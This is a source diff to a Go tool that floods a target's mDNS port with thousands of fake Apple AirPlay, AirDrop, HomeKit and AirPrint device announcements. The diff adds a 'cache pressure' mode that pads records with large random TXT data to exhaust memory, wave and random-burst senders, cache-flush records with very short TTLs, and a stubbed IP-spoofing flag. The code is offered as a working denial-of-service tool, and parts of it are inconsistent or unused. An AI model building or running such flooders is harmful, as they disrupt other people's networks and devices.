@@ -7,6 +7,7 @@ import (
 	"math/rand"
 	"net"
 	"os"
+	"runtime"
 	"strings"
 	"syscall"
 	"time"
@@ -172,6 +173,106 @@ const (
 	BroadcastTypeAirPrint BroadcastType = "airprint"
 	BroadcastTypeAll      BroadcastType = "all"
 )
+
+// 1. Add a rawSocket type definition
+type rawSocket struct {
+	fd      int
+	ifIndex int
+}
+
+// 2. Add the configureRawSocket function
+func configureRawSocket(interfaceName string) (*net.UDPConn, error) {
+	// Note: For true IP spoofing, we'd need to:
+	// 1. Create a raw socket (syscall.SOCK_RAW)
+	// 2. Set IP_HDRINCL to craft our own IP headers
+	// 3. Return a structure that wraps this raw socket
+
+	// However, this requires root/admin privileges and platform-specific code
+
+	// For now, log a warning and use regular UDP socket
+	log.Printf("WARNING: True IP spoofing is not implemented yet. Using regular UDP socket.")
+	log.Printf("The -spoof flag is recognized but not functional in this version.")
+
+	// This is the same as the non-spoofed connection
+	conn, err := net.ListenUDP("udp4", &net.UDPAddr{
+		IP:   net.IPv4zero,
+		Port: 0,
+	})
+	if err != nil {
+		return nil, fmt.Errorf("failed to create UDP socket: %v", err)
+	}
+
+	return conn, nil
+}
+
+// 3. Add the broadcastAnnouncements function
+func broadcastAnnouncements(conn *net.UDPConn, announcements []*dns.Msg, debug bool) {
+	startTime := time.Now()
+	announcementCount := 0
+
+	for _, announcement := range announcements {
+		announcementBytes, err := announcement.Pack()
+		if err != nil {
+			if debug {
+				log.Printf("Error packing announcement: %v", err)
+			}
+			continue
+		}
+
+		if _, err := conn.Write(announcementBytes); err != nil {
+			if debug {
+				log.Printf("Error sending announcement: %v", err)
+			}
+		}
+
+		announcementCount++
+	}
+
+	if debug {
+		log.Printf("Broadcast completed: sent %d announcements in %v",
+			announcementCount, time.Since(startTime))
+	}
+}
+
+// 4. Add the generateDeviceAnnouncements function
+func generateDeviceAnnouncements(name string, deviceID string, broadcastTypes []BroadcastType) []*dns.Msg {
+	var announcements []*dns.Msg
+
+	// Create a map for faster lookup
+	typeMap := make(map[BroadcastType]bool)
+	for _, t := range broadcastTypes {
+		typeMap[t] = true
+	}
+
+	// Check if we should include all types
+	includeAll := typeMap[BroadcastTypeAll]
+
+	// Add AirPlay announcements if requested
+	if includeAll || typeMap[BroadcastTypeAirPlay] {
+		airplayAnnouncements := createAirPlayAnnouncements(name, deviceID)
+		announcements = append(announcements, airplayAnnouncements...)
+	}
+
+	// Add AirDrop announcements if requested
+	if includeAll || typeMap[BroadcastTypeAirDrop] {
+		airdropAnnouncements := createAirDropAnnouncements(name, deviceID)
+		announcements = append(announcements, airdropAnnouncements...)
+	}
+
+	// Add HomeKit announcements if requested
+	if includeAll || typeMap[BroadcastTypeHomeKit] {
+		homekitAnnouncements := createHomeKitAnnouncements(name, deviceID)
+		announcements = append(announcements, homekitAnnouncements...)
+	}
+
+	// Add AirPrint announcements if requested
+	if includeAll || typeMap[BroadcastTypeAirPrint] {
+		airprintAnnouncements := createAirPrintAnnouncements(name, deviceID)
+		announcements = append(announcements, airprintAnnouncements...)
+	}
+
+	return announcements
+}
 
 func generateDeviceName() string {
 	// Create random device names using the arrays
@@ -817,6 +918,71 @@ func preGenerateDevices(count int, broadcastTypes []BroadcastType, debug bool) [
 	return announcements
 }
 
+// Add new function to efficiently pre-generate massive number of devices
+func efficientPreGeneration(count int, broadcastTypes []BroadcastType, debug bool) []*dns.Msg {
+	if debug {
+		log.Printf("Efficiently pre-generating %d devices...", count)
+	}
+
+	// Use worker pools for parallel generation
+	workers := runtime.NumCPU()
+	jobs := make(chan int, count)
+	results := make(chan []*dns.Msg, count)
+
+	// Start worker pool
+	for w := 1; w <= workers; w++ {
+		go func() {
+			for range jobs {
+				name := generateDeviceName()
+				dnsName, _ := sanitizeDeviceName(name)
+				deviceID := generateDeviceID()
+
+				var deviceAnnouncements []*dns.Msg
+
+				// Generate announcements based on types
+				for _, bType := range broadcastTypes {
+					switch bType {
+					case BroadcastTypeAirPlay, BroadcastTypeAll:
+						deviceAnnouncements = append(deviceAnnouncements,
+							createAirPlayAnnouncements(dnsName, deviceID)...)
+					case BroadcastTypeAirDrop:
+						deviceAnnouncements = append(deviceAnnouncements,
+							createAirDropAnnouncements(dnsName, deviceID)...)
+					case BroadcastTypeHomeKit:
+						deviceAnnouncements = append(deviceAnnouncements,
+							createHomeKitAnnouncements(dnsName, deviceID)...)
+					case BroadcastTypeAirPrint:
+						deviceAnnouncements = append(deviceAnnouncements,
+							createAirPrintAnnouncements(dnsName, deviceID)...)
+					}
+				}
+
+				results <- deviceAnnouncements
+			}
+		}()
+	}
+
+	// Send jobs to workers
+	for i := 0; i < count; i++ {
+		jobs <- i
+	}
+	close(jobs)
+
+	// Collect results
+	var announcements []*dns.Msg
+	for i := 0; i < count; i++ {
+		deviceAnnouncements := <-results
+		announcements = append(announcements, deviceAnnouncements...)
+
+		// Progress reporting
+		if debug && i > 0 && i%10000 == 0 {
+			log.Printf("Generated %d/%d devices", i, count)
+		}
+	}
+
+	return announcements
+}
+
 func main() {
 	numDevices := flag.Int("n", 1000, "Number of devices to advertise")
 	debug := flag.Bool("debug", false, "Enable debug logging")
@@ -827,6 +993,8 @@ func main() {
 	broadcastTypeStr := flag.String("type", "all", "Broadcast type: airplay, airdrop, homekit, airprint, or all")
 	regenerate := flag.Bool("regenerate", false, "Generate new device names for each broadcast round")
 	preGenerate := flag.Bool("pregenerate", false, "Pre-generate devices once and reuse them")
+	spoof := flag.Bool("spoof", false, "Enable IP address spoofing (requires root)")
+	cacheMode := flag.String("cache", "standard", "Cache pressure mode: standard, aggressive, extreme")
 	flag.Parse()
 
 	// Show help if requested or no arguments provided
@@ -896,11 +1064,19 @@ Notes:
 	var conn *net.UDPConn
 	var err error
 
-	// For unicast addresses, we don't need to specify the interface in the socket
-	conn, err = net.DialUDP("udp4", nil, &net.UDPAddr{
-		IP:   targetIPAddr,
-		Port: 5353,
-	})
+	if *spoof {
+		// Configure raw socket for IP spoofing
+		conn, err = configureRawSocket(*interfaceName)
+		if err != nil {
+			log.Fatalf("Failed to configure raw socket: %v", err)
+		}
+	} else {
+		// Use regular UDP socket
+		conn, err = net.DialUDP("udp4", nil, &net.UDPAddr{
+			IP:   targetIPAddr,
+			Port: 5353,
+		})
+	}
 
 	if err != nil {
 		log.Fatal(err)
@@ -941,6 +1117,17 @@ Notes:
 
 	// Track how many rounds we've sent
 	roundsSent := 0
+
+	// Use proper variable assignment
+	var deviceMultiplier int
+	switch *cacheMode {
+	case "aggressive":
+		deviceMultiplier = 10 // Generate 10x more records per device
+	case "extreme":
+		deviceMultiplier = 100 // Generate 100x more records per device
+	default:
+		deviceMultiplier = 1
+	}
 
 	// Main broadcast loop
 	for {
@@ -999,6 +1186,28 @@ Notes:
 		if waitTime > 0 {
 			time.Sleep(waitTime)
 		}
+
+		// Send in waves to trigger batch processing
+		switch *cacheMode {
+		case "wave":
+			currentAnnouncements = sendInWavePattern(conn, currentAnnouncements, *debug)
+		case "random":
+			// Send in random bursts to be unpredictable
+			currentAnnouncements = sendInRandomBursts(conn, currentAnnouncements, *debug)
+		default:
+			// Standard steady broadcasts
+			broadcastAnnouncements(conn, currentAnnouncements, *debug)
+		}
+
+		// If cacheFlush is enabled, create special cache-flush records
+		if deviceMultiplier > 1 && *debug {
+			log.Printf("Using cache pressure multiplier: %d", deviceMultiplier)
+
+			// Optionally, actually use the multiplier in device generation
+			if *preGenerate {
+				currentAnnouncements = generateDevicesForCachePressure(*numDevices, broadcastTypes, deviceMultiplier, *debug)
+			}
+		}
 	}
 }
 
@@ -1054,5 +1263,183 @@ func generateDevicesForTypes(count int, broadcastTypes []BroadcastType, debug bo
 			log.Printf("Generated device %d/%d: %s (%s)", i+1, count, displayName, strings.TrimSpace(broadcastInfo))
 		}
 	}
+
 	return announcements
+}
+
+// New function to send spoofed packets
+func sendSpoofedPacket(socket *rawSocket, payload []byte, srcIP net.IP, dstIP net.IP) error {
+	// This function would:
+	// 1. Craft IP header with the spoofed source IP
+	// 2. Craft UDP header
+	// 3. Combine headers with payload
+	// 4. Send via raw socket
+
+	// Not implemented in this version
+	return fmt.Errorf("IP spoofing not implemented")
+}
+
+// Modified generateDevices function to enhance cache pressure
+func generateDevicesForCachePressure(count int, broadcastTypes []BroadcastType, multiplier int, debug bool) []*dns.Msg {
+	var announcements []*dns.Msg
+
+	for i := 0; i < count; i++ {
+		// Standard device generation
+		name := generateDeviceName()
+		dnsName, displayName := sanitizeDeviceName(name)
+		deviceID := generateDeviceID()
+
+		// Generate standard announcements
+		deviceAnnouncements := generateDeviceAnnouncements(dnsName, deviceID, broadcastTypes)
+		announcements = append(announcements, deviceAnnouncements...)
+
+		// Add extra records to increase cache pressure
+		if multiplier > 1 {
+			for j := 0; j < multiplier-1; j++ {
+				// Generate variant records with slight differences
+				extraName := fmt.Sprintf("%s-extra%d", dnsName, j+1)
+				// Add TXT records with increasing sizes to consume more memory
+				extraTXT := createExtraSizedTXTRecord(extraName, j*1024) // Increasing record sizes
+				announcements = append(announcements, extraTXT)
+			}
+		}
+
+		if debug && (i == 0 || i == count-1 || i%1000 == 0) {
+			log.Printf("Generated device %d/%d: %s with %d extra records",
+				i+1, count, displayName, multiplier-1)
+		}
+	}
+
+	return announcements
+}
+
+// Generate TXT records with specified size to consume more cache memory
+func createExtraSizedTXTRecord(name string, size int) *dns.Msg {
+	msg := new(dns.Msg)
+	msg.Response = true
+	msg.Authoritative = true
+
+	// Create large TXT record
+	txt := &dns.TXT{
+		Hdr: dns.RR_Header{
+			Name:   fmt.Sprintf("%s._large-txt._tcp.local.", name),
+			Rrtype: dns.TypeTXT,
+			Class:  dns.ClassINET | 0x8000,
+			Ttl:    4500,
+		},
+		Txt: []string{
+			generateRandomString(size),
+		},
+	}
+
+	msg.Answer = []dns.RR{txt}
+	return msg
+}
+
+// Generate random string of specified size
+func generateRandomString(size int) string {
+	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	result := make([]byte, size)
+	for i := range result {
+		result[i] = chars[rand.Intn(len(chars))]
+	}
+	return string(result)
+}
+
+// Send announcements in wave pattern
+func sendInWavePattern(conn *net.UDPConn, announcements []*dns.Msg, debug bool) []*dns.Msg {
+	announceCount := len(announcements)
+	waveSizes := []int{1000, 5000, 10000, 15000, 20000, 15000, 10000, 5000, 1000}
+
+	startIndex := 0
+	for _, waveSize := range waveSizes {
+		if startIndex >= announceCount {
+			break
+		}
+
+		endIndex := startIndex + waveSize
+		if endIndex > announceCount {
+			endIndex = announceCount
+		}
+
+		if debug {
+			log.Printf("Sending wave of %d announcements", endIndex-startIndex)
+		}
+
+		// Send this wave rapidly
+		for i := startIndex; i < endIndex; i++ {
+			announcementBytes, _ := announcements[i].Pack()
+			conn.Write(announcementBytes)
+		}
+
+		// Short pause between waves
+		time.Sleep(100 * time.Millisecond)
+		startIndex = endIndex
+	}
+
+	return announcements
+}
+
+// Send announcements in random bursts
+func sendInRandomBursts(conn *net.UDPConn, announcements []*dns.Msg, debug bool) []*dns.Msg {
+	announceCount := len(announcements)
+	burstSizes := []int{100, 500, 1000, 5000, 10000, 50000}
+
+	// Fix: Replace the unused variable 'i' with a more descriptive name that indicates its purpose
+	for burstIndex := 0; burstIndex < 5; burstIndex++ { // Do 5 bursts and return
+		burstSize := burstSizes[rand.Intn(len(burstSizes))]
+		if burstSize > announceCount {
+			burstSize = announceCount
+		}
+
+		if debug {
+			log.Printf("Sending burst of %d announcements", burstSize)
+		}
+
+		// Use range operator with _
+		for k := 0; k < burstSize; k++ {
+			announcementBytes, _ := announcements[rand.Intn(announceCount)].Pack()
+			conn.Write(announcementBytes)
+		}
+
+		// Wait between bursts
+		waitTime := time.Duration(rand.Intn(500)) * time.Millisecond
+		time.Sleep(waitTime)
+	}
+
+	return announcements
+}
+
+// Generate records that specifically target cache flush behavior
+func generateCacheFlushRecords(count int) []*dns.Msg {
+	var records []*dns.Msg
+
+	for i := 0; i < count; i++ {
+		// Create record with cache-flush bit set
+		msg := new(dns.Msg)
+		msg.Response = true
+		msg.Authoritative = true
+
+		name := fmt.Sprintf("flush-%d.local.", i)
+
+		// A record with cache-flush bit set
+		aRecord := &dns.A{
+			Hdr: dns.RR_Header{
+				Name:   name,
+				Rrtype: dns.TypeA,
+				Class:  dns.ClassINET | 0x8000, // Cache flush bit
+				Ttl:    1,                      // Very short TTL
+			},
+			A: generateRandomIP(),
+		}
+
+		msg.Answer = []dns.RR{aRecord}
+		records = append(records, msg)
+
+		// Also create matching PTR with same name but without flush
+		ptrRecord := createQuery(name, dns.TypePTR)
+		records = append(records, ptrRecord)
+	}
+
+	return records
 }
